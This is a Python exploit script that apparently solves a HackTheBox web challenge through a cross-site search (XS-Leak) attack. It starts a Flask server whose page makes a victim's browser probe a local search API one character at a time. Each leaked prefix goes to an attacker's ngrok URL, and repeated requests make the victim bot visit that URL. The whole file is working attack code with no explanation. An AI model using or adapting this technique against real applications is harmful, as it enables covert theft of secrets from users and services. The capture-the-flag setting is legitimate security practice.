#!/usr/bin/env python3

import logging
import requests

from flask import Flask, request
from pwn import log, sys, threading
from urllib.parse import unquote

logging.getLogger('werkzeug').disabled = True
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *_: None

if len(sys.argv) != 3:
    log.error(f'Usage: python3 {sys.argv[0]} <victim-url> <ngrok-url>')

victim_url = sys.argv[1]
ngrok_url = sys.argv[2]

flag = 'HTB{'

app = Flask(__name__)


@app.route('/')
def index():
    global flag

    if request.query_string != b'':
        flag = unquote(request.query_string.decode()[5:])
        return ''

    return f'''<!doctype html>
<html>
  <head></head>
  <body>
    <script>
      const flag = '{flag}'
      const characters = '}}0123456789abcdefghijklmnopqrstuvwxyz!#$@'.split('')

      for (const c of characters) {{
        const s = document.createElement('script')
        s.src = 'http://127.0.0.1:1337/api/entries/search?q=' + encodeURIComponent(flag + c)
        s.onload = () => location.href = '{ngrok_url}?flag=' + encodeURIComponent(flag + c)
        document.head.appendChild(s)
      }}
    </script>
  </body>
</html>
'''


def main():
    global flag

    threading.Thread(target=lambda: app.run(
        host='0.0.0.0', port=80, debug=False, use_reloader=False)).start()

    flag_progress = log.progress('Flag')

    while '}' not in flag:
        previous_flag = flag
        requests.post(f'{victim_url}/api/entries', json={'url': ngrok_url})

        if flag == previous_flag:
            flag += '_'

        flag_progress.status(flag)

    flag_progress.success(flag)


if __name__ == '__main__':
    main()
